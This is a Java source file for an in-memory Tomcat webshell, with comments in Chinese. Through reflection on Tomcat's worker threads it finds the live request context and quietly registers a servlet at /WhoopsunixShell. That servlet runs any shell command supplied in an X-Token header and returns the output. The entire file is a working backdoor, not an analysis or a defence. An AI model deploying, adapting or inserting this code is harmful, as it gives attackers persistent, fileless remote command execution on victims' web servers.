package com.demo.memshell;

import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 * Thread 获取上下文注入 Tomcat Servlet 型内存马
 * Tomcat 7 8 9
 */
public class TSMSThread implements Servlet {

    final private static String NAME = "Whoopsunix";
    final private static String pattern = "/WhoopsunixShell";

    private static HttpServletRequest request;
    private static HttpServletResponse response;

    public TSMSThread() {

    }

    static {
        try {
            /**
             * 获取 request、response 对象
             */
            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
            boolean isFind = false;
            for (int i = 0; i < threads.length; i++) {
                if (isFind) break;
                Thread thread = threads[i];
                // Thread 筛选
                if (thread == null)
                    continue;
                String threadName = thread.getName();
                if (!(
                        ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
                                || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
                                || (threadName.contains("http-") && threadName.contains("Acceptor"))
                ))
                    continue;
                Object target = getFieldValue(thread, "target");
                Object this0 = getFieldValue(target, "this$0");
                Object handler = getFieldValue(this0, "handler");
                Object global = getFieldValue(handler, "global");
                java.util.List processors = (java.util.List) getFieldValue(global, "processors");

                for (int j = 0; j < processors.size(); j++) {
                    Object processor = processors.get(j);
                    Object req = getFieldValue(processor, "req");
                    request = (HttpServletRequest) req.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(req, new Integer(1));
                    response = (HttpServletResponse) request.getClass().getMethod("getResponse").invoke(request);
                    isFind = true;
                    break;
                }
            }

            /**
             * 注入 Servlet
             */
            StandardContext standardContext;
            try {
                ServletContext servletContext = (ServletContext) request.getClass().getDeclaredMethod("getServletContext").invoke(request);
                ApplicationContext applicationContext = (ApplicationContext) getFieldValue(servletContext, "context");
                standardContext = (StandardContext) getFieldValue(applicationContext, "context");
            }catch (NoSuchMethodException e) {
                standardContext = (StandardContext) getFieldValue(request, "context");
            }

            // wrapper 封装
            if (standardContext.findChild(NAME) == null) {
                org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
                wrapper.setName(NAME);
                Servlet servlet = new TSMSThread();
                wrapper.setServletClass(servlet.getClass().getName());
                wrapper.setServlet(servlet);
                // 添加到 standardContext
                standardContext.addChild(wrapper);

                try{
                    // M1 Servlet映射到URL模式
                    // standardContext.addServletMapping(pattern,NAME);
                    Method addServletMappingMethod = standardContext.getClass().getDeclaredMethod("addServletMapping", String.class, String.class);
                    addServletMappingMethod.setAccessible(true);
                    addServletMappingMethod.invoke(standardContext, pattern, NAME);
                } catch (NoSuchMethodException e) {
                    // M2 Servlet3 新特性 Dynamic
//                        javax.servlet.ServletRegistration.Dynamic registration = new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext);
//                        registration.addMapping(pattern);
                    Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext), (Object) new String[]{pattern});
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            String header = httpServletRequest.getHeader("X-Token");
            if (header == null) {
                return;
            }
            String result = exec(header);
            PrintWriter printWriter = servletResponse.getWriter();
            printWriter.println("TSMSThread injected");
            printWriter.println(result);
        } catch (Exception e) {

        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    /**
     * tools
     */
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
